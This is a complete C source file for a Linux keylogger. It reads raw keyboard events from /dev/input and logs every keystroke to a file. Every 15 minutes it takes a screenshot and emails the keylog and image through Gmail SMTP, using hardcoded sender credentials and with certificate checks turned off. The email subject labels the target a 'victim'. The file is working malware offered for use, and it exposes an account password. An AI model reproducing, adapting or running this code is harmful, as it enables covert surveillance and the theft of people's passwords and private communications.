#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <linux/input.h>
#include <unistd.h>
#include <fcntl.h>
#include <curl/curl.h>
#include <sys/time.h>
#include <pthread.h>

#define LSIZ 70
#define RSIZ 100
#define FROM_MAIL     "doi2xuyenviet7@gmail.com"
#define TO_MAIL       "nguyenngocdoanh1998@gmail.com"
const char b64chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
char event_file_path[18] = "/dev/input/event";

char * payload_text =
  "Content-Type: multipart/mixed; boundary================3165153444163065104==\r\n"
  "MIME-Version: 1.0\r\n"
  "From: doi2xuyenviet7@gmail.com\r\n"
  "To: nguyenngocdoanh1998@gmail.com\r\n"
  "Subject: Remote keystroke victim !!!\r\n\r\n"
  "--===============3165153444163065104==\r\n"
  "Content-Type: application/octet-stream\r\n"
  "MIME-Version: 1.0\r\n"
  "Content-Transfer-Encoding: base64\r\n"
  "Content-Disposition: attachment; filename= log.txt\r\n\r\n";

char * payload_image =
  "\r\n--===============3165153444163065104==\r\n"
  "Content-Type: image/jpeg\r\n"
  "MIME-Version: 1.0\r\n"
  "Content-Transfer-Encoding: base64\r\n"
  "Content-ID: <1>\r\n\r\n";

char * boundary =  "\r\n--===============3165153444163065104==--\r\n.\r\n";

size_t b64_encoded_size(size_t inlen)
{
	size_t ret;

	ret = inlen;
	if (inlen % 3 != 0)
		ret += 3 - (inlen % 3);
	ret /= 3;
	ret *= 4;

	return ret;
}

char *b64_encode(const unsigned char *in, size_t len)
{
	char   *out;
	size_t  elen;
	size_t  i;
	size_t  j;
	size_t  v;

	if (in == NULL || len == 0)
		return NULL;

	elen = b64_encoded_size(len);
	out  = malloc(elen+1);
	out[elen] = '\0';

	for (i=0, j=0; i<len; i+=3, j+=4) {
		v = in[i];
		v = i+1 < len ? v << 8 | in[i+1] : v << 8;
		v = i+2 < len ? v << 8 | in[i+2] : v << 8;

		out[j]   = b64chars[(v >> 18) & 0x3F];
		out[j+1] = b64chars[(v >> 12) & 0x3F];
		if (i+1 < len) {
			out[j+2] = b64chars[(v >> 6) & 0x3F];
		} else {
			out[j+2] = '=';
		}
		if (i+2 < len) {
			out[j+3] = b64chars[v & 0x3F];
		} else {
			out[j+3] = '=';
		}
	}

	return out;
}

void find_event_file_path(){
    FILE *fp;
    char line[RSIZ][LSIZ];
    int i = 0;
    int lines = 0;

    fp = fopen("/proc/bus/input/devices", "r");
    if (fp == NULL){
        perror("Error while opening the file.\n");
        exit(EXIT_FAILURE);
    }

    while(fgets(line[i], LSIZ, fp)){
        line[i][strlen(line[i])-1] = '\0';
        i++;
    }
    lines = i;

    for(i=0;i<lines;i++){
        //printf("%s\"\n", line[i]);
        if (strstr(line[i], "EV=120013") != NULL){
            for(int j=i-1;j>0;j--){
                if (strstr(line[j], "Handlers") != NULL){
                    strcat(event_file_path, strstr(line[j], "event") + 5);
                    event_file_path[17] = '\0';
                    printf("%s\n", event_file_path);
                }
            }
        }
    }
    fclose(fp);
}

char* find_key(int code){
    switch(code){
        case 1: return "[ESC]";
        case 2: return "1";
        case 3: return "2";
        case 4: return "3";
        case 5: return "4";
        case 6: return "5";
        case 7: return "6";
        case 8: return "7";
        case 9: return "8";
        case 10: return "9";
        case 11: return "0";
        case 12: return "-";
        case 13: return "=";
        case 14: return "[BACKSPACE]";
        case 15: return "[TAB]";
        case 16: return "q";
        case 17: return "w";
        case 18: return "e";
        case 19: return "r";
        case 20: return "t";
        case 21: return "y";
        case 22: return "u";
        case 23: return "i";
        case 24: return "o";
        case 25: return "p";
        case 26: return "[";
        case 27: return "]";
        case 28: return "[ENTER]";
        case 29: return "[CTRL]";
        case 30: return "a";
        case 31: return "s";
        case 32: return "d";
        case 33: return "f";
        case 34: return "g";
        case 35: return "h";
        case 36: return "j";
        case 37: return "k";
        case 38: return "l";
        case 39: return ";";
        case 40: return "'";
        case 41: return "`";
        case 42: return "[SHIFT]";
        case 43: return "\\";
        case 44: return "z";
        case 45: return "x";
        case 46: return "c";
        case 47: return "v";
        case 48: return "b";
        case 49: return "n";
        case 50: return "m";
        case 51: return ",";
        case 52: return ".";
        case 53: return "/";
        case 54: return "[SHIFT]";
        case 55: return "*";
        case 57: return "[SPACE]";
        case 58: return "[CAPSLOCK]";
        case 102: return "[HOME]";
        case 103: return "[UP]";
        case 104: return "[PGUP]";
        case 105: return "[LEFT]";
        case 106: return "[RIGHT]";
        case 107: return "[END]";
        case 108: return "[DOWN]";
        case 109: return "[PGDN]";
        default: return "";
    }
}

struct upload_status {
  size_t bytes_read;
};

static size_t payload_source(char *ptr, size_t size, size_t nmemb, void *userp)
{
  struct upload_status *upload_ctx = (struct upload_status *)userp;
  const char *data;
  size_t room = size * nmemb;

  if((size == 0) || (nmemb == 0) || ((size*nmemb) < 1)) {
    return 0;
  }

  data = &payload_text[upload_ctx->bytes_read];
  printf("%s\n", data);

  if(data) {
    size_t len = strlen(data);
    if(room < len)
      len = room;
    memcpy(ptr, data, len);
    upload_ctx->bytes_read += len;

    return len;
  }

  return 0;
}

char * concat_string(char * s1, char * s2, char* s3){
    char * s4 = (char *) malloc(1 + strlen(s1)+ strlen(s2) + strlen(s3));
    strcpy(s4, s1);
    strcat(s4, s2);
    strcat(s4, s3);
    return s4;
}

int send_email(){
    CURL *curl;
    CURLcode res = CURLE_OK;
    struct curl_slist *recipients = NULL;
    struct upload_status upload_ctx = { 0 };

    FILE *fp_text;
    char *buff = malloc(sizeof(char) *1024*1024);
    fp_text = fopen("log.txt", "r");
    fscanf(fp_text, "%s", buff);
    char * enc = b64_encode((const unsigned char *)buff, strlen(buff));
    char * payload_text_origin = payload_text;
    char * tmp = concat_string(payload_text, enc, payload_image);
    //printf("%s\n", payload_text);
    system("scrot -o screen.png");
    system("cat screen.png | base64 -w0 > screen_enc.txt");
    char *buff1 = malloc(sizeof(char)*1024*1024);
    FILE *fp_image = fopen("screen_enc.txt", "r");
    fscanf(fp_image, "%s", buff1);
    //printf("%s\n", buff1);
    payload_text = concat_string(tmp, buff1, boundary);
    //printf("%d\n", strlen(payload_text));

    curl = curl_easy_init();
    if(curl) {
        curl_easy_setopt(curl, CURLOPT_USERNAME, "doi2xuyenviet7@gmail.com");
        curl_easy_setopt(curl, CURLOPT_PASSWORD, "@123456789@");
        curl_easy_setopt(curl, CURLOPT_URL, "smtp://smtp.gmail.com:587");
        curl_easy_setopt(curl, CURLOPT_USE_SSL, (long)CURLUSESSL_ALL);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
        curl_easy_setopt(curl, CURLOPT_MAIL_FROM, FROM_MAIL);

        recipients = curl_slist_append(recipients, TO_MAIL);
        curl_easy_setopt(curl, CURLOPT_MAIL_RCPT, recipients);

        curl_easy_setopt(curl, CURLOPT_READFUNCTION, payload_source);
        curl_easy_setopt(curl, CURLOPT_READDATA, &upload_ctx);
        curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);

        curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);

        /* Send the message */
        res = curl_easy_perform(curl);

        /* Check for errors */
        if(res != CURLE_OK)
            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));

        /* Free the list of recipients */
        curl_slist_free_all(recipients);

        /* Always cleanup */
        curl_easy_cleanup(curl);
    }
    payload_text = payload_text_origin;
    free(buff);free(buff1);
    free(tmp);
    free(enc);
    fclose(fp_text);
    fclose(fp_image);
    return (int)res;
}

void *trigger_send_email(){
    while(1){
        send_email();
        sleep(15*60);
    }
}

void *keylogger(){
    find_event_file_path();
    //struct timeval start_time;
    //gettimeofday(&start_time, 0);
    //struct timeval current_time;

    FILE * fp_out = fopen("log.txt", "a");
    struct input_event event;
    int events = open(event_file_path, O_RDONLY);
    while(1){
        read(events,&event, sizeof(event));
        if(event.type == 1 && event.value == 1){
            //printf("Key: %i State: %i\n",event.code,event.value);
            //printf("Typed: %s\n",find_key(event.code));
            fputs(find_key(event.code), fp_out);
            fflush(fp_out);
        }
        //gettimeofday(&current_time, 0);
        //if (current_time.tv_sec - start_time.tv_sec > 20){
        //    printf("Trigger send email\n");
        //    start_time = current_time;
        //}
    }
    fclose(fp_out);

}

int main() {
    pthread_t tid_keylogger;
    pthread_create(&tid_keylogger, NULL, keylogger, (void *)&keylogger);

    pthread_t tid_trigger_send_email;
    pthread_create(&tid_trigger_send_email, NULL, trigger_send_email, (void *)&trigger_send_email);

    pthread_exit(NULL);
    return 0;
}
